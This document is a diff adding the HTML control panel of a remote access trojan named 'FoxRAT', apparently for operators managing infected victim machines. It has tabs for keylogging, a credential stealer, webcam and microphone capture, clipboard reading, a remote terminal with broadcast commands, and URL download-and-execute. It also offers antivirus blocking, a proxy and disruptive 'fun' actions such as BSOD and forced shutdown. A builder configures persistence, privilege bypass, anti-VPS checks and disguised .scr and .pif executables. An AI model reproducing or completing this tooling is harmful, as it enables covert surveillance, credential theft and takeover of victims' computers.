@@ -1,0 +1,593 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>FoxRAT Panel</title>
+<link rel="stylesheet" href="style.css">
+</head>
+<body>
+<canvas id="particle-canvas"></canvas>
+<div id="toast-container"></div>
+<div id="auth-screen">
+    <div class="auth-box">
+        <h1>Fox<span>RAT</span></h1>
+        <div id="auth-login-form">
+            <input type="text" id="auth-user" placeholder="Username" autocomplete="username">
+            <input type="password" id="auth-pass" placeholder="Password" autocomplete="current-password">
+            <button id="auth-btn">Login</button>
+            <p id="auth-err" class="error"></p>
+            <p class="auth-switch">No account? <a href="#" id="auth-show-register">Register</a></p>
+        </div>
+        <div id="auth-register-form" style="display:none">
+            <input type="text" id="reg-user" placeholder="Username (min 3)" autocomplete="username">
+            <input type="password" id="reg-pass" placeholder="Password (min 4)" autocomplete="new-password">
+            <input type="password" id="reg-pass2" placeholder="Confirm password" autocomplete="new-password">
+            <button id="reg-btn">Register</button>
+            <p id="reg-err" class="error"></p>
+            <p class="auth-switch">Have account? <a href="#" id="auth-show-login">Login</a></p>
+        </div>
+    </div>
+</div>
+
+<div id="app" style="display:none">
+    <div class="sidebar">
+        <div class="sidebar-top">
+            <div class="sidebar-logo">Fox<span>RAT</span></div>
+        </div>
+        <nav class="sidebar-nav">
+            <a class="nav-item active" data-tab="dashboard">Dashboard</a>
+            <a class="nav-item" data-tab="info">Information</a>
+            <a class="nav-item" data-tab="users">Users <span class="badge" id="user-count-badge">0</span></a>
+            <a class="nav-item" data-tab="fun">Rofl</a>
+            <a class="nav-item" data-tab="audio">Audio</a>
+            <a class="nav-item" data-tab="keylogger">KeyLogger <span class="badge" id="kl-badge" style="display:none">0</span></a>
+            <a class="nav-item" data-tab="blocker">Blocker</a>
+            <a class="nav-item" data-tab="remotestart">Remote start</a>
+            <a class="nav-item" data-tab="stealler">Stealler</a>
+            <a class="nav-item" data-tab="communication">Communication</a>
+            <a class="nav-item" data-tab="clipboard">Clipboard</a>
+            <a class="nav-item" data-tab="taskmanager">Task manager</a>
+            <a class="nav-item" data-tab="filemanager">File manager</a>
+            <a class="nav-item" data-tab="terminal">Terminal</a>
+            <a class="nav-item" data-tab="webcam">Webcam</a>
+            <a class="nav-item" data-tab="remotedesktop">Remote desktop</a>
+            <a class="nav-item" data-tab="settings">Settings</a>
+            <a class="nav-item" data-tab="builder">Builder</a>
+        </nav>
+        <div class="sidebar-bottom">
+            <div class="user-selector">
+                <select id="sidebar-user-select">
+                    <option value="">No clients</option>
+                </select>
+            </div>
+            <div class="user-hostname" id="sidebar-hostname">—</div>
+            <div class="user-status" id="sidebar-status">Disconnected</div>
+            <div class="sidebar-username" id="sidebar-username"></div>
+        </div>
+    </div>
+
+    <div class="main">
+        <!-- Dashboard -->
+        <div class="tab-content active" id="tab-dashboard">
+            <div class="info-card-green">
+                <div class="card-header"><span>Dashboard</span></div>
+                <div class="dash-stats">
+                    <div class="dash-stat"><div class="dash-num" id="stat-clients">0</div><div>Clients</div></div>
+                    <div class="dash-stat"><div class="dash-num" id="stat-online">0</div><div>Online Now</div></div>
+                    <div class="dash-stat"><div class="dash-num" id="stat-commands">0</div><div>Commands</div></div>
+                </div>
+                <div class="broadcast-row">
+                    <input type="text" id="broadcast-input" class="card-input" placeholder="Shell command for ALL clients..." style="margin-bottom:0;flex:1">
+                    <button class="card-btn" id="broadcast-btn">Broadcast</button>
+                </div>
+            </div>
+            <div class="info-card-green">
+                <div class="card-header"><span>Log</span></div>
+                <div id="dashboard-log" class="log-box"></div>
+            </div>
+        </div>
+
+        <!-- Information -->
+        <div class="tab-content" id="tab-info">
+            <div class="info-card-green">
+                <div class="card-header"><span>PC Info</span><button class="refresh-btn" id="pcinfo-refresh">↻</button></div>
+                <div class="info-grid" id="pcinfo-grid">
+                    <div class="info-row"><span class="info-label">Username:</span><span class="info-value" id="pi-user">—</span></div>
+                    <div class="info-row"><span class="info-label">PC-name:</span><span class="info-value" id="pi-host">—</span></div>
+                    <div class="info-row"><span class="info-label">User id:</span><span class="info-value" id="pi-id">—</span></div>
+                    <div class="info-row"><span class="info-label">Ip:</span><span class="info-value" id="pi-ip">—</span></div>
+                    <div class="info-row"><span class="info-label">Location:</span><span class="info-value" id="pi-loc">—</span></div>
+                    <div class="info-row"><span class="info-label">ASN:</span><span class="info-value" id="pi-asn">—</span></div>
+                    <div class="info-row"><span class="info-label">Hosting:</span><span class="info-value" id="pi-hosting">—</span></div>
+                    <div class="info-row"><span class="info-label">Active window:</span><span class="info-value" id="pi-awin">—</span></div>
+                    <div class="info-row"><span class="info-label">System:</span><span class="info-value" id="pi-os">—</span></div>
+                    <div class="info-row"><span class="info-label">Last active:</span><span class="info-value" id="pi-last">—</span></div>
+                    <div class="info-row"><span class="info-label">Debut:</span><span class="info-value" id="pi-debut">—</span></div>
+                    <div class="info-row"><span class="info-label">Admin rights:</span><span class="info-value" id="pi-admin">—</span></div>
+                    <div class="info-row"><span class="info-label">CPU:</span><span class="info-value" id="pi-cpu">—</span></div>
+                    <div class="info-row"><span class="info-label">GPU:</span><span class="info-value" id="pi-gpu">—</span></div>
+                    <div class="info-row"><span class="info-label">Ram:</span><span class="info-value" id="pi-ram">—</span></div>
+                    <div class="info-row"><span class="info-label">Comment:</span><input type="text" id="pi-comment" class="info-input" placeholder=""></div>
+                </div>
+            </div>
+            <div class="info-card-green">
+                <div class="card-header"><span>Online statistics</span></div>
+                <div class="stats-bar-wrap">
+                    <div class="stats-bar"><div class="stats-online" id="stats-online-bar" style="width:35%"></div><div class="stats-offline" id="stats-offline-bar" style="width:65%"></div></div>
+                </div>
+                <div class="stats-text" id="stats-text">Online: 0 min (0%) | Offline: 0 min (0%)</div>
+            </div>
+            <div class="info-card-green">
+                <div class="card-header"><span>Build info</span></div>
+                <div class="info-grid">
+                    <div class="info-row"><span class="info-label">Build id:</span><span class="info-value" id="bi-id">—</span></div>
+                    <div class="info-row"><span class="info-label">Endpoint:</span><span class="info-value" id="bi-endpoint">—</span></div>
+                    <div class="info-row"><span class="info-label">Build version:</span><span class="info-value" id="bi-ver">—</span></div>
+                    <div class="info-row"><span class="info-label">Autorun:</span><span class="info-value" id="bi-autorun">—</span></div>
+                    <div class="info-row"><span class="info-label">Path:</span><span class="info-value" id="bi-path">—</span></div>
+                    <div class="info-row"><span class="info-label">Run key:</span><span class="info-value" id="bi-runkey">—</span></div>
+                    <div class="info-row"><span class="info-label">Hide file:</span><span class="info-value" id="bi-hide">—</span></div>
+                    <div class="info-row"><span class="info-label">Autosteal:</span><span class="info-value" id="bi-steal">—</span></div>
+                </div>
+                <div class="card-actions">
+                    <button class="btn-red" id="bi-uninstall">Uninstall</button>
+                    <button class="btn-red" id="bi-kill">Kill</button>
+                </div>
+            </div>
+            <div class="info-card-green">
+                <div class="card-header"><span>Important files</span></div>
+                <div class="info-grid">
+                    <div class="info-row"><span class="info-label">Media files:</span><span class="info-value ok">OK</span></div>
+                    <div class="info-row"><span class="info-label">HVNC files:</span><span class="info-value ok">OK</span></div>
+                </div>
+            </div>
+        </div>
+
+        <!-- Remote Start -->
+        <div class="tab-content" id="tab-remotestart">
+            <div class="info-card-green">
+                <div class="card-header"><span>Upload & exec file</span></div>
+                <div class="upload-zone" id="upload-zone">
+                    <div class="upload-icon">⬆</div>
+                    <div class="upload-text">SELECT FILE</div>
+                    <div class="upload-sub">drag & drop or click to choose</div>
+                    <input type="file" id="rs-file" style="display:none">
+                </div>
+            </div>
+            <div class="info-card-green">
+                <div class="card-header"><span>Upload & exec from url</span></div>
+                <input type="text" id="rs-url" class="card-input" placeholder="https://domain.zone/path/file.exe">
+                <button class="card-btn" id="rs-url-btn">uploadExecUrl</button>
+            </div>
+        </div>
+
+        <!-- Proxy -->
+        <div class="tab-content" id="tab-proxy">
+            <div class="info-card-green">
+                <div class="card-header"><span>SOCKS5 Proxy</span></div>
+                <div class="info-grid">
+                    <div class="info-row"><span class="info-label">Status:</span><span class="info-value" id="proxy-status">Stopped</span></div>
+                    <div class="info-row"><span class="info-label">Port:</span><span class="info-value" id="proxy-port">1080</span></div>
+                </div>
+                <div class="card-actions">
+                    <button class="card-btn" id="proxy-start">Start</button>
+                    <button class="card-btn" id="proxy-stop">Stop</button>
+                </div>
+            </div>
+        </div>
+
+        <!-- Stealler -->
+        <div class="tab-content" id="tab-stealler">
+            <div class="info-card-green">
+                <div class="card-header"><span>Stealler</span></div>
+                <div class="info-grid">
+                    <div class="info-row"><span class="info-label">Status:</span><span class="info-value" id="steal-status">Ready</span></div>
+                </div>
+                <div class="card-actions">
+                    <button class="card-btn" id="steal-start">Start Steal</button>
+                </div>
+            </div>
+        </div>
+
+        <!-- Communication -->
+        <div class="tab-content" id="tab-communication">
+            <div class="info-card-green">
+                <div class="card-header"><span>Chat with User</span></div>
+                <div class="chat-box" id="comm-messages">
+                    <div style="color:var(--text-muted);text-align:center;padding:20px">Select a user and start chatting. Your nick: <span style="color:var(--accent)">h@ck3r</span></div>
+                </div>
+                <div class="chat-row">
+                    <input type="text" id="comm-input" class="card-input" placeholder="Type a message...">
+                    <button class="card-btn" id="comm-send">Send</button>
+                    <button class="card-btn btn-red" id="comm-close">Close Chat</button>
+                </div>
+            </div>
+        </div>
+
+        <!-- Clipboard -->
+        <div class="tab-content" id="tab-clipboard">
+            <div class="info-card-green">
+                <div class="card-header"><span>Clipboard</span><button class="refresh-btn" id="clip-refresh">↻</button></div>
+                <textarea id="clip-output" class="card-textarea" readonly placeholder="Clipboard content..."></textarea>
+            </div>
+        </div>
+
+        <!-- Roff -->
+        <div class="tab-content" id="tab-roff">
+            <div class="info-card-green">
+                <div class="card-header"><span>Roff</span></div>
+                <p class="card-desc">Remote office features</p>
+                <div class="card-actions">
+                    <button class="card-btn" id="roff-screenshot">Screenshot</button>
+                    <button class="card-btn" id="roff-webcam">Webcam</button>
+                </div>
+            </div>
+        </div>
+
+        <!-- Code & Scripts -->
+        <div class="tab-content" id="tab-codescripts">
+            <div class="info-card-green">
+                <div class="card-header"><span>Code & Scripts</span></div>
+                <textarea id="cs-code" class="card-textarea" placeholder="Write code here..."></textarea>
+                <div class="card-actions">
+                    <select id="cs-lang" class="card-select">
+                        <option value="python">Python</option>
+                        <option value="batch">Batch</option>
+                        <option value="powershell">PowerShell</option>
+                        <option value="vbs">VBScript</option>
+                    </select>
+                    <button class="card-btn" id="cs-run">Execute</button>
+                </div>
+                <textarea id="cs-output" class="card-textarea" readonly placeholder="Output..." style="margin-top:8px"></textarea>
+            </div>
+        </div>
+
+        <!-- Communication -->
+        <div class="tab-content" id="tab-communication">
+            <div class="info-card-green">
+                <div class="card-header"><span>Chat</span></div>
+                <div id="chat-messages" class="chat-box"></div>
+                <div class="chat-row">
+                    <input type="text" id="chat-input" class="card-input" placeholder="Type message...">
+                    <button class="card-btn" id="chat-send">Send</button>
+                </div>
+            </div>
+        </div>
+
+        <!-- Task Manager -->
+        <div class="tab-content" id="tab-taskmanager">
+            <div class="tm-tabs">
+                <button class="tm-tab active" data-tm="processes">☑ Processes</button>
+                <button class="tm-tab" data-tm="devices">⚙ Devices</button>
+                <button class="tm-tab" data-tm="windows">☐ Windows</button>
+            </div>
+            <div class="tm-search-row">
+                <input type="text" id="tm-search" class="card-input" placeholder="Search processes...">
+                <button class="card-btn" id="tm-refresh">↻ Refresh</button>
+            </div>
+            <div id="tm-process-list" class="tm-list"></div>
+            <div id="tm-devices-list" class="tm-list" style="display:none"></div>
+            <div id="tm-windows-list" class="tm-list" style="display:none"></div>
+        </div>
+
+        <!-- File Manager -->
+        <div class="tab-content" id="tab-filemanager">
+            <div class="fm-path-row">
+                <input type="text" id="fm-path" class="card-input" placeholder="C:\Users\" value="C:\">
+                <button class="card-btn" id="fm-go">Go</button>
+                <button class="card-btn" id="fm-refresh">↻</button>
+            </div>
+            <div id="fm-list" class="fm-list"></div>
+        </div>
+
+        <!-- Terminal -->
+        <div class="tab-content" id="tab-terminal">
+            <div class="info-card-green">
+                <div class="card-header"><span>Terminal</span></div>
+                <div id="term-output" class="term-box"></div>
+                <div class="term-row">
+                    <span class="term-prompt">&gt;</span>
+                    <input type="text" id="term-input" class="card-input" placeholder="Command...">
+                    <button class="card-btn" id="term-send">Run</button>
+                </div>
+            </div>
+        </div>
+
+        <!-- KeyLogger -->
+        <div class="tab-content" id="tab-keylogger">
+            <div class="info-card-green">
+                <div class="card-header"><span>KeyLogger</span></div>
+                <div class="card-actions">
+                    <button class="card-btn" id="kl-start">Start</button>
+                    <button class="card-btn" id="kl-stop">Stop</button>
+                    <button class="card-btn" id="kl-dump">Dump</button>
+                    <label class="kl-check"><input type="checkbox" id="kl-auto" checked> Auto-dump 30s</label>
+                </div>
+                <textarea id="kl-output" class="card-textarea" readonly placeholder="Keylog output..." style="margin-top:8px"></textarea>
+            </div>
+        </div>
+
+        <!-- Webcam -->
+        <div class="tab-content" id="tab-webcam">
+            <div class="info-card-green">
+                <div class="card-header"><span>Webcam</span></div>
+                <div class="card-actions">
+                    <button class="card-btn" id="wc-start">Start</button>
+                    <button class="card-btn" id="wc-stop">Stop</button>
+                    <span id="wc-status" class="card-status">Stopped</span>
+                </div>
+                <div id="wc-feed" class="wc-feed"><div class="placeholder-text">Start webcam</div></div>
+            </div>
+        </div>
+
+        <!-- Remote Desktop -->
+        <div class="tab-content" id="tab-remotedesktop">
+            <div class="info-card-green">
+                <div class="card-header"><span>Remote Desktop</span></div>
+                <div class="card-actions">
+                    <button class="card-btn" id="rd-start">Start</button>
+                    <button class="card-btn" id="rd-stop">Stop</button>
+                    <span class="input-mode-label">Control:</span>
+                    <button class="card-btn mode-btn active" data-mode="all">All</button>
+                    <button class="card-btn mode-btn" data-mode="mouse">Mouse</button>
+                    <button class="card-btn mode-btn" data-mode="keyboard">Keyboard</button>
+                    <span id="rd-mode-status" class="card-status">Disabled</span>
+                </div>
+                <div id="rd-feed" class="rd-feed"><div class="placeholder-text">Click Start to begin</div></div>
+            </div>
+        </div>
+
+        <!-- Users -->
+        <div class="tab-content" id="tab-users">
+            <div class="info-card-green">
+                <div class="card-header"><span>Users</span></div>
+                <input type="text" id="user-search" class="card-input" placeholder="Search...">
+                <div id="users-container" class="users-list"></div>
+            </div>
+        </div>
+
+        <!-- Fun -->
+        <div class="tab-content" id="tab-fun">
+            <div class="info-card-green">
+                <div class="card-header"><span>Rofl</span></div>
+                <div class="fun-grid">
+                    <div class="fun-item"><h4>Message Box</h4><input type="text" id="fun-msgbox-title" class="card-input" placeholder="Title" value="FoxRAT"><input type="text" id="fun-msgbox-text" class="card-input" placeholder="Text"><button class="card-btn" id="fun-msgbox-btn">Send MsgBox</button></div>
+                    <div class="fun-item"><h4>Wallpaper</h4><input type="text" id="fun-wallpaper-url" class="card-input" placeholder="Image URL"><button class="card-btn" id="fun-wallpaper-btn">Set Wallpaper</button></div>
+                    <div class="fun-item"><h4>Text to Speech</h4><input type="text" id="fun-speak-text" class="card-input" placeholder="Text"><button class="card-btn" id="fun-speak-btn">Speak</button></div>
+                    <div class="fun-item"><h4>CD-ROM</h4><button class="card-btn" id="fun-cdrom-btn">CD-ROM Toggle</button></div>
+                    <div class="fun-item"><h4>Screen & Input</h4><button class="card-btn" id="fun-screenoff-btn">Turn Off Monitor</button><button class="card-btn" id="fun-blockinput-btn">Block Input</button><button class="card-btn" id="fun-unblockinput-btn">Unblock Input</button></div>
+                    <div class="fun-item"><h4>Desktop</h4><button class="card-btn" id="fun-deskhide-btn">Hide Icons</button><button class="card-btn" id="fun-deskshow-btn">Show Icons</button><button class="card-btn" id="fun-taskmgroff-btn">Disable TaskMgr</button><button class="card-btn" id="fun-taskmgron-btn">Enable TaskMgr</button></div>
+                    <div class="fun-item"><h4>Mouse</h4><input type="number" id="fun-mouse-x" class="card-input" placeholder="X" value="500"><input type="number" id="fun-mouse-y" class="card-input" placeholder="Y" value="500"><button class="card-btn" id="fun-mousemove-btn">Move</button><button class="card-btn" id="fun-jiggle-btn">Jiggle</button></div>
+                    <div class="fun-item"><h4>Volume</h4><input type="range" id="fun-volume" min="0" max="100" value="50"><span id="fun-volume-val">50%</span><button class="card-btn" id="fun-volume-btn">Set</button><button class="card-btn" id="fun-volumemute-btn">Mute</button></div>
+                    <div class="fun-item"><h4>Type Text</h4><input type="text" id="fun-type-text" class="card-input" placeholder="Text"><button class="card-btn" id="fun-type-btn">Type</button></div>
+                    <div class="fun-item"><h4>Download & Exec</h4><input type="text" id="fun-dl-url" class="card-input" placeholder="URL"><button class="card-btn" id="fun-dl-btn">Download</button></div>
+                    <div class="fun-item"><h4>Process</h4><input type="text" id="fun-proc-name" class="card-input" placeholder="Name"><button class="card-btn" id="fun-prockill-btn">Kill</button><button class="card-btn" id="fun-procstart-btn">Start</button><button class="card-btn" id="fun-proclist-btn">List</button><button class="card-btn btn-red" id="fun-taskkillall-btn">Kill All</button></div>
+                    <div class="fun-item"><h4>Misc</h4><button class="card-btn" id="fun-idle-btn">Idle Time</button><button class="card-btn" id="fun-persist-btn">Persist</button><button class="card-btn" id="fun-uninstall-btn">Uninstall</button></div>
+
+                    <div class="fun-item" style="grid-column:1/-1;border-color:#0f0"><h4 style="color:#0f0">Screen Effects</h4>
+                        <button class="card-btn" id="fun-flip-btn">Flip</button>
+                        <button class="card-btn" id="fun-invert-btn">Invert</button>
+                        <button class="card-btn" id="fun-blackout-btn">Blackout</button>
+                        <button class="card-btn" id="fun-matrix-btn">Matrix</button>
+                        <button class="card-btn" id="fun-rainbow-btn">Rainbow</button>
+                        <button class="card-btn" id="fun-glitch-btn">Glitch</button>
+                        <button class="card-btn" id="fun-spiral-btn">Spiral</button>
+                        <button class="card-btn" id="fun-scanlines-btn">Scanlines</button>
+                        <button class="card-btn" id="fun-thermal-btn">Thermal</button>
+                        <button class="card-btn" id="fun-nightvision-btn">Night Vision</button>
+                        <button class="card-btn" id="fun-invertcolors-btn">Invert Colors</button>
+                        <button class="card-btn" id="fun-disco-btn">Disco</button>
+                        <button class="card-btn" id="fun-blue-btn">Blue</button>
+                        <button class="card-btn" id="fun-redscreen-btn">Red</button>
+                        <button class="card-btn" id="fun-green-btn">Green</button>
+                        <button class="card-btn" id="fun-white-btn">White</button>
+                        <button class="card-btn" id="fun-rotate-btn">Rotate 180</button>
+                        <button class="card-btn btn-red" id="fun-restorescreen-btn">Restore</button>
+                    </div>
+
+                    <div class="fun-item" style="grid-column:1/-1"><h4>Cursor</h4>
+                        <button class="card-btn" id="fun-penis-btn">Penis Cursor</button>
+                        <button class="card-btn" id="fun-cursorbig-btn">Big Cursor</button>
+                        <button class="card-btn" id="fun-cursorhide-btn">Hide Cursor</button>
+                        <button class="card-btn" id="fun-cursorshow-btn">Show Cursor</button>
+                        <button class="card-btn" id="fun-spider-btn">Spider Cursor</button>
+                        <button class="card-btn" id="fun-dizzy-btn">Dizzy Cursor</button>
+                        <button class="card-btn btn-red" id="fun-penis-off-btn">Restore Cursor</button>
+                    </div>
+
+                    <div class="fun-item" style="grid-column:1/-1"><h4>Window Chaos</h4>
+                        <button class="card-btn" id="fun-shrink-btn">Shrink All</button>
+                        <button class="card-btn" id="fun-maxall-btn">Maximize All</button>
+                        <button class="card-btn" id="fun-cascade-btn">Cascade</button>
+                        <button class="card-btn" id="fun-tile-btn">Tile</button>
+                        <button class="card-btn" id="fun-alwaystop-btn">Always On Top</button>
+                        <button class="card-btn" id="fun-notop-btn">Unpin All</button>
+                        <button class="card-btn" id="fun-fullscreen-btn">Fullscreen FG</button>
+                        <button class="card-btn" id="fun-shake-btn">Shake Window</button>
+                        <button class="card-btn" id="fun-elevator-btn">Elevator</button>
+                        <button class="card-btn" id="fun-puzzle-btn">Puzzle</button>
+                        <button class="card-btn" id="fun-hidewindow-btn">Hide FG</button>
+                        <button class="card-btn" id="fun-showwindow-btn">Show All</button>
+                        <button class="card-btn" id="fun-tiny-btn">Tiny FG</button>
+                    </div>
+
+                    <div class="fun-item"><h4>Window Title</h4><input type="text" id="fun-titlebar-text" class="card-input" placeholder="New title"><button class="card-btn" id="fun-titlebar-btn">Change Title</button></div>
+                    <div class="fun-item"><h4>Transparency</h4><input type="number" id="fun-trans-val" class="card-input" placeholder="0-255" value="128"><button class="card-btn" id="fun-trans-btn">Set</button></div>
+
+                    <div class="fun-item"><h4>URL & Errors</h4><input type="text" id="fun-url-input" class="card-input" placeholder="https://..."><button class="card-btn" id="fun-openurl-btn">Open URL</button><input type="text" id="fun-error-text" class="card-input" placeholder="Error text"><button class="card-btn" id="fun-fakeerror-btn">Fake Error</button></div>
+
+                    <div class="fun-item" style="grid-column:1/-1"><h4>System Chaos</h4>
+                        <button class="card-btn" id="fun-bsod-btn">BSOD</button>
+                        <button class="card-btn" id="fun-virus-btn">Virus Popups</button>
+                        <button class="card-btn" id="fun-popups-btn">Spam Popups</button>
+                        <button class="card-btn" id="fun-spamnotepad-btn">Spam Notepad</button>
+                        <button class="card-btn" id="fun-eject-btn">Eject CD</button>
+                        <button class="card-btn" id="fun-keyboard-btn">Keyboard Lights</button>
+                        <button class="card-btn" id="fun-echo-btn">Echo Sound</button>
+                        <button class="card-btn" id="fun-heartbeat-btn">Heartbeat</button>
+                        <input type="number" id="fun-shutdown-time" class="card-input" placeholder="sec" value="30">
+                        <button class="card-btn btn-red" id="fun-shutdown-btn">Shutdown</button>
+                        <button class="card-btn" id="fun-abortshutdown-btn">Abort Shutdown</button>
+                    </div>
+
+                    <div class="fun-item" style="grid-column:1/-1"><h4>Movement</h4>
+                        <button class="card-btn" id="fun-wobble-btn">Wobble</button>
+                        <button class="card-btn" id="fun-circle-btn">Circle</button>
+                        <button class="card-btn" id="fun-jiggle2-btn">Jiggle Mouse</button>
+                    </div>
+
+                    <div class="fun-item" style="grid-column:1/-1;border-color:#f44"><h4 style="color:#f44">FUCK SYSTEM</h4><button class="card-btn btn-red" id="fun-fuck-btn" style="font-size:16px;padding:12px 24px">FUCK!</button></div>
+                    <div class="fun-item" style="grid-column:1/-1;border-color:#ff0"><h4 style="color:#ff0">ELITE ROASTS</h4><button class="card-btn" id="fun-elite-btn" style="font-size:16px;padding:12px 24px;border-color:#ff0;color:#ff0">ELITE</button></div>
+                </div>
+            </div>
+            <div id="fun-log" class="log-box" style="margin-top:8px"></div>
+        </div>
+
+        <!-- Audio -->
+        <div class="tab-content" id="tab-audio">
+            <div class="info-card-green">
+                <div class="card-header"><span>Audio Capture</span></div>
+                <div class="card-actions">
+                    <button class="card-btn" id="livemic-start">Start Live Mic</button>
+                    <button class="card-btn" id="livemic-stop">Stop</button>
+                    <span id="livemic-status" class="card-status">Stopped</span>
+                </div>
+                <div id="livemic-indicator" style="display:none;margin-top:8px;text-align:center">
+                    <span style="color:#f44;font-size:12px">LIVE</span>
+                </div>
+                <div id="livemic-player" style="margin-top:8px"></div>
+            </div>
+            <div class="info-card-green">
+                <div class="card-header"><span>Record Clip</span></div>
+                <div class="card-actions">
+                    <span class="input-mode-label">Duration (1-30s):</span>
+                    <input type="number" id="audio-duration" class="card-input" style="width:80px;margin:0" min="1" max="30" value="5">
+                    <button class="card-btn" id="audio-record-btn">Record</button>
+                    <span id="audio-status" class="card-status">Ready</span>
+                </div>
+                <div id="audio-player" style="margin-top:8px"><audio id="audio-playback" controls style="width:100%"></audio></div>
+            </div>
+        </div>
+
+        <!-- Blocker -->
+        <div class="tab-content" id="tab-blocker">
+            <div class="info-card-green">
+                <div class="card-header"><span>Blocker</span></div>
+                <div class="card-actions">
+                    <button class="card-btn btn-red" id="blocker-av-btn">Block All AV</button>
+                </div>
+                <div class="card-actions" style="margin-top:8px">
+                    <input type="text" id="blocker-proc-name" class="card-input" style="width:200px;margin:0" placeholder="Process name">
+                    <button class="card-btn btn-red" id="blocker-kill-btn">Kill Process</button>
+                </div>
+            </div>
+            <div id="blocker-log" class="log-box" style="margin-top:8px"></div>
+        </div>
+
+        <!-- Settings -->
+        <div class="tab-content" id="tab-settings">
+            <div class="info-card-green">
+                <div class="card-header"><span>Theme Colors</span></div>
+                <div class="settings-row"><label>Background</label><input type="color" id="setting-bg" value="#0d0d0d"></div>
+                <div class="settings-row"><label>Accent</label><input type="color" id="setting-accent" value="#00ff88"></div>
+                <div class="settings-row"><label>Sidebar</label><input type="color" id="setting-sidebar" value="#111111"></div>
+                <div class="card-actions"><button class="card-btn" id="setting-apply">Apply</button></div>
+                <div class="preset-row">
+                    <button class="card-btn preset-btn" data-bg="#0d0d0d" data-accent="#00ff88" data-sidebar="#111111">Default</button>
+                    <button class="card-btn preset-btn" data-bg="#1a0a0a" data-accent="#ff4444" data-sidebar="#1e1212">Red</button>
+                    <button class="card-btn preset-btn" data-bg="#0a0a1a" data-accent="#4488ff" data-sidebar="#12121e">Blue</button>
+                    <button class="card-btn preset-btn" data-bg="#0a1a0a" data-accent="#44ff88" data-sidebar="#121e12">Green</button>
+                </div>
+            </div>
+            <div class="info-card-green">
+                <div class="card-header"><span>Background Image</span></div>
+                <p class="card-desc">Upload or paste a URL for custom background</p>
+                <div class="settings-row"><label>Image URL:</label><input type="text" id="bg-url-input" class="card-input" style="margin:0;flex:1" placeholder="https://example.com/image.jpg"></div>
+                <div class="card-actions">
+                    <input type="file" id="bg-upload" accept="image/*" style="display:none">
+                    <button class="card-btn" id="bg-upload-btn">Upload File</button>
+                    <button class="card-btn" id="bg-url-btn">Apply URL</button>
+                    <button class="card-btn" id="bg-clear-btn">Remove Background</button>
+                </div>
+            </div>
+            <div class="info-card-green">
+                <div class="card-header"><span>Visual Effects</span></div>
+                <p class="card-desc">Add falling particles to the background</p>
+                <div class="settings-row"><label>Particles:</label>
+                    <select id="particle-select" class="card-select">
+                        <option value="none">None</option>
+                        <option value="snow">Snow</option>
+                        <option value="rain">Rain</option>
+                        <option value="sakura">Sakura</option>
+                        <option value="feathers">Feathers</option>
+                    </select>
+                </div>
+                <div class="settings-row"><label>Intensity:</label>
+                    <input type="range" id="particle-count" min="20" max="200" value="80" style="flex:1">
+                    <span id="particle-count-val" style="color:var(--accent);font-size:12px;width:40px;text-align:right">80</span>
+                </div>
+            </div>
+        </div>
+
+        <!-- Builder -->
+        <div class="tab-content" id="tab-builder">
+            <div class="info-card-green">
+                <div class="card-header"><span>Builder</span></div>
+                <div class="builder-layout">
+                    <div class="builder-col">
+                        <div class="builder-row"><span class="builder-label">Name:</span><input type="text" id="builder-filename" class="builder-input" value="name" placeholder="name"></div>
+                        <div class="builder-row"><span class="builder-label">Mutex:</span><input type="text" id="builder-mutex" class="builder-input" value="" placeholder="auto-generated"></div>
+                        <div class="builder-row"><span class="builder-label">Comment:</span><input type="text" id="builder-comment" class="builder-input" value="" placeholder="comment"></div>
+                        <div class="builder-row"><span class="builder-label">Anti-VPS:</span><label class="builder-toggle"><input type="checkbox" id="builder-antivps"><span class="toggle-slider"></span></label></div>
+                        <div class="builder-row"><span class="builder-label">Extension:</span><select id="builder-ext" class="builder-select"><option value=".exe">.exe</option><option value=".scr">.scr</option><option value=".com">.com</option><option value=".pif">.pif</option></select></div>
+                        <div class="builder-row"><span class="builder-label">Stub:</span><select id="builder-stub" class="builder-select"><option value="default">Default</option></select></div>
+                    </div>
+                    <div class="builder-col">
+                        <div class="builder-row"><span class="builder-label">Auto Steal:</span><select id="builder-autosteal" class="builder-select"><option value="once">Once</option><option value="always">Always</option><option value="never">Never</option></select></div>
+                        <div class="builder-row"><span class="builder-label">Force admin:</span><select id="builder-admin" class="builder-select"><option value="normal">Normal</option><option value="admin">Admin</option><option value="bypass">Bypass</option></select></div>
+                        <div class="builder-row"><span class="builder-label">Install:</span><select id="builder-install" class="builder-select"><option value="random">Random</option><option value="system32">System32</option><option value="appdata">AppData</option><option value="temp">Temp</option></select></div>
+                        <div class="builder-row"><span class="builder-label">Autorun:</span><select id="builder-autorun" class="builder-select"><option value="scheduler">Scheduler</option><option value="registry">Registry</option><option value="startup">Startup</option><option value="none">None</option></select></div>
+                        <div class="builder-row"><span class="builder-label">Copy count:</span><div class="builder-counter"><button class="counter-btn" id="builder-copy-minus">-</button><span class="counter-val" id="builder-copy-val">2</span><button class="counter-btn" id="builder-copy-plus">+</button></div></div>
+                        <div class="builder-row"><span class="builder-label">Hide files:</span><label class="builder-toggle"><input type="checkbox" id="builder-hidefiles"><span class="toggle-slider"></span></label></div>
+                    </div>
+                </div>
+                <div class="builder-warning">Default settings are recommended.</div>
+                <div class="builder-actions">
+                    <button class="card-btn builder-create-btn" id="builder-build-btn">Create</button>
+                    <button class="card-btn" id="builder-scripts-btn">Scripts</button>
+                    <button class="card-btn" id="builder-geoblock-btn">GeoBlock</button>
+                </div>
+                <span id="builder-status" class="card-status" style="margin-top:8px;display:block"></span>
+            </div>
+        </div>
+    </div>
+</div>
+
+<div id="context-menu" class="ctx-menu" style="display:none">
+    <div class="ctx-header" id="ctx-user-name">User</div>
+    <div class="ctx-divider"></div>
+    <div class="ctx-item" data-action="info">Information</div>
+    <div class="ctx-item" data-action="screenshot">Screenshot</div>
+    <div class="ctx-item" data-action="monitor">Monitor</div>
+    <div class="ctx-item" data-action="webcam">Webcam</div>
+    <div class="ctx-item" data-action="audio">Audio</div>
+    <div class="ctx-item" data-action="keylog">KeyLogger</div>
+    <div class="ctx-divider"></div>
+    <div class="ctx-item" data-action="connect">Connect</div>
+    <div class="ctx-item" data-action="disconnect">Disconnect</div>
+    <div class="ctx-divider"></div>
+    <div class="ctx-item" data-action="blockmouse">Block Mouse</div>
+    <div class="ctx-item" data-action="blockkey">Block Keyboard</div>
+    <div class="ctx-item" data-action="unblockinput">Unblock Input</div>
+    <div class="ctx-divider"></div>
+    <div class="ctx-item" data-action="msgbox">Message Box</div>
